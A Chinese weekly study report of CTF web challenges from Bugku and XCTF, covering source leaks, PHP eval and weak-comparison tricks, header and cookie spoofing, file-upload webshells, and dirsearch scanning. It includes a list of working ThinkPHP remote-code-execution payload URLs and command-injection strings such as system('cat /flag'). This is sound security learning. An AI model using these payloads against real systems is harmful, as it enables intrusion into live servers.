# 周报四

本周进行Bugku CTF，XCTF等 WEB方向的练习，总结了一些笔记

## 你必须让它停下--抓包调试

页面不停闪烁，需要让它停下拿到flag，抓包发现其实每次闪过的图片并不一样，在intruder模块不停发送，直至看到flag

## source--源码泄露

https://www.cnblogs.com/Lmg66/p/13598803.htmlCTF常见源码泄露

https://ctf101.dropsec.xyz/web/leak.html 信息泄露

base64解码后意识到可能是个假的flag，使用dirsearch扫描后发现.git目录和flag.txt文件，可能是源码泄露，下载后git reflog ，，git show

**信息泄露**有以下几方面：

- 网页源代码（注释）和响应头
- robots.txt
- 网站备份文件，如`www.zip`、`index.php.bak`
- 版本控制目录，如`.git`、`.svn`
- 开发环境遗留文件
  - 临时文件（`vi`、`vim`、`gedit`生成的文件）
  - `.DS_store`文件
  - `.idea`文件夹
  - 文件读取（包含）漏洞

## 备份是个好习惯--弱类型比较

给了一串字符串，由两部分相同字符串组成，没有发现其他规律。扫描看到有index.php.bak文件，下载查看

```php
include_once "flag.php"; 
ini_set("display_errors", 0); 
$str = strstr($_SERVER['REQUEST_URI'], '?'); # 提取 URL ? 后面字符 
$str = substr($str,1); # 从下标为 1 截取后面字符
$str = str_replace('key','',$str); # 过滤 key
parse_str($str); # 解析查询字符串直接为变量和值
echo md5($key1); 
echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){ 
    echo $flag."取得flag";
}
```

总结一下就是需要使参数key1和key2不相等，他们的MD5弱类型相等。以及由于参数名称被过滤，所以需要嵌套写入:kkeyey。

## 变量1--PHP全局变量

```php
error_reporting(0); 
include "flag1.php"; 
highlight_file(__file__); 
if(isset($_GET['args'])){ 
    $args = $_GET['args']; 
    if(!preg_match("/^\w+$/",$args)){ # 判断字符串是否由字母数字或下划线组成
        die("args error!");
    }
    eval("var_dump($$args);"); 
}
```

思路：通过args参数查询某合适变量的值得到flag。由于并不明确flag保存在哪个变量，所以试想使用$GLOBALS超全局变量获取所有变量和值，则$args的值为GLOBALS

## 本地管理员--X-FORWARDED-FOR头

根据题目提示，需要联系本地管理员登录。

如果客户端通过代理服务器请求后台服务器，代理服务器通常携带客户端特定请求头字段，项服务器传递IP地址，使用X-Forwarded字段。抓包添加该请求头，使用本地IP地址

## game1--抓包、规律

游戏代码比较复杂，不好入手。游戏过程中抓包，注意分析每次结果，三个参数score,ip,以及base64编码的sign,解码sign发现规律，是由zM+base64(score)+==组成的，更改分数，再次传参发送

## eval

```php
<?php
    include "flag.php"; 
    $a = @$_REQUEST['hello']; 
    eval( "var_dump($a);"); 
    show_source(__FILE__); 
?>
```

还是首先尝试全局变量，不过行不通。根据eval将字符串的代码当作php代码执行的特性，传递eval(system('cat /flag'))，双重嵌套

## 你从哪里来--请求头伪造

根据提示还是要设置请求头，

Referer 和 X-Forwarded-For 的区别：

- X-Forwarded-For：一般只能是 IP 格式。记录请求经过的客户端 IP 和代理服务器 IP，用于识别客户端的真实网络地址（尤其当请求经过多层代理时）。格式：以IP 地址为核心，多个 IP 用逗号分隔，格式为 `客户端IP, 代理1IP, 代理2IP, ...`。
- Referer：可以是 URL或 IP 格式 （例如： http://192.168.100.13:4000/index.html 这种格式）它记录了前序页面的 URL 地址，也可以被服务器识别从哪个页面跳转过来的

## cookies--cookies欺骗

给了重复的字符串，没发现什么规律。看到url

```
http://171.80.2.169:14796/index.php?line=&filename=a2V5cy50eHQ=
```

先base64解码filename是keys.txt,尝试直接访问index.php被重定向，改成keys.txt显示空白，那么应该需要使用base64访问index.php，并给line传入值

```
index.php?line=2&filename=aW5kZXgucGhw
```

看到一条语句，下面就可以拼凑源代码

```python
import requests
s=requests.Session()
url='http://123.206.87.240:8002/web11/index.php'
for i in range(1,20):
    payload={'line':str(i),'filename':'aW5kZXgucGhw'}
    a=s.get(url,params=payload).content
    content=str(a,encoding="utf-8")
    print(content)
```

```php
error_reporting(0); 
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:""); 
$line=isset($_GET['line'])?intval($_GET['line']):0; 
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ="); 
$file_list = array( '0' =>'keys.txt', '1' =>'index.php', ); 
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){ 
    $file_list[2]='keys.php';
} 
if(in_array($file, $file_list)){ 
    $fa = file($file); 
    echo $fa[$line]; 
    } 
?> 
```

接下来访问keys.php并写入cookie即可

![image-20260214212400389](D:\PROJECT\MDProject\report\周报四.assets\image-20260214212400389.png)

## 文件上传 

先上传一张图片马，这里把后缀改成png会识别出php文件

![image-20260214213607878](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20260214213607878.png)

可是蚁剑就是连接不上。。wp上说要把Content-Type改一个大写字母绕过，并且后缀名改成php4，没意思。上传成功后也访问不了，壁垒这道题

--------

下面是XCTF的练习

## php_rce--Think_Php漏洞、Linux命令

该网页使用think_php框架，搜索漏洞，看看不同版本的漏洞

```
thinkphp 5.0.22
1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username
2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password
3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

thinkphp 5
1、http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1

thinkphp 5.0.21
1、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
2、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

thinkphp 5.1.
1、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1
2、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd
3、http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
4、http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
5、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
6、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd
7、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
8、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd

5.0.20
1、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

```

使用thinkphp 5.1.payload，

```
/?s=index/\think\Container/invokefunction & function=call_user_func_array&vars[0]=system&vars[1][]=ls
```

回显![image-20260215174925903](D:\PROJECT\MDProject\report\周报四.assets\image-20260215174925903.png)

使用5.0.20版本的payload回显如下，接下来抓取flag

```
/?s=index/\think\app/invokefunction&function = call_user_func_array&vars[0]=system&vars[1][]=ls
```

![image-20260215175019866](D:\PROJECT\MDProject\report\周报四.assets\image-20260215175019866.png)

```
/?s = index/\think\app/invokefunction&function = call_user_func_array & vars[0] = system&vars[1][] = find / -name "flag"
```

显示/flag /flag说明flag在flag文件下

```
/?s = index/\think\app/invokefunction&function = call_user_func_array&vars[0] = system&vars[1][] = cat /flag
```

查看得到flag

## upload-1

可以查看源代码

```php
function check(){
upfile = document.getElementById("upfile");
submit = document.getElementById("submit");
name = upfile.value;
ext = name.replace(/^.+\./,''); // 提取后缀
if(['jpg','png'].contains(ext)){ //需上传这种类型的图片
	submit.disabled = false;}
else{
	submit.disabled = true;
	alert('请选择一张图片文件上传!');}}
```

上传shell.png，bp中修改文件后缀为php

![image-20260215181633595](D:\PROJECT\MDProject\report\周报四.assets\image-20260215181633595.png)

![image-20260215181752009](D:\PROJECT\MDProject\report\周报四.assets\image-20260215181752009.png)

访问该文件

![image-20260215182304708](D:\PROJECT\MDProject\report\周报四.assets\image-20260215182304708.png)

## 文件包含

```php
 <?php
highlight_file(__FILE__);
    include("./check.php");
    if(isset($_GET['filename'])){
        $filename  = $_GET['filename'];
        include($filename);
    }
?>
```

之前做过一个代码相同的题，思路完全相同，不过响应结果不太一样

![image-20260215184658501](D:\PROJECT\MDProject\report\周报四.assets\image-20260215184658501.png)

![image-20260215184835015](D:\PROJECT\MDProject\report\周报四.assets\image-20260215184835015.png)

# 网络命令

**ping**：测试网络连通性

```
ping -i [时间] ip:每隔[时间]访问一次
ping -c [数量] ip:发送[数量]个数据包
ping -f ip:快速发送ICMP数据包，进行压力测试
ping -f -c [数量] ip:设定具体法宝数量，快速检测响应时间等数据
ping -s [大小] ip:设定每个ICMP数据包的大小
```

**ip**

```
ipconfig:查看网卡及IP信息
arp -an:arp协议 查看相邻计算机
netstat -r:查看路由IP地址
route add default gw ip:添加默认网关
ifconfig ens33 up/down:启动/关闭网卡
ifconfig ens33 ip:临时修改ip
netstat -anlop:查看当前系统端口占用情况
```

**traceroute**

```
Linux:traceroute ip:跟踪到ip的所有路由节点和路径，默认30个跃点
Win:tracert ip
```

**curl**

```
curl -O url:下载文件，保存文件时使用原始文件名
curl [file] url:将输出保存到指定文件
curl -I url:仅显示Http标头
curl -L url:自动跟随重定向
curl -d ["post"] -X POST url:发送POST请求，-X指定请求方法
curl -H ["header"] -X POST -d '{"key":"value"}' url:自定义请求头
curl -v url:显示详细请求和响应信息
curl -s url:静默输出，不显示进度条和错误信息 
```

https://zhuanlan.zhihu.com/p/11077262655

# dirseach

```
python dirsearch.py -u http://target.com -e php,zip,bak,txt,sql,json -t 100 --exclude-status 404,500
 -u：目标网址。
-e php,zip,bak,txt,sql,json：指定后缀名。
敏感文件：
zip/rar/tar.gz：源码备份包（挖到这个直接拿高危漏洞）。
bak/txt：管理员留下的备份文件或说明书。
sql：数据库备份。
注：如果对方是 Java 站，把 php 改成 jsp 或 java。
-t 100：线程数。
--exclude-status 404,500：降噪。
```

```
针对有防火墙的目标：
python dirsearch.py -u http://target.com --random-agent --delay 1
--random-agent：随机 User-Agent。
--delay 1：延时。
```

https://www.cnblogs.com/gccbuaa/p/19545246

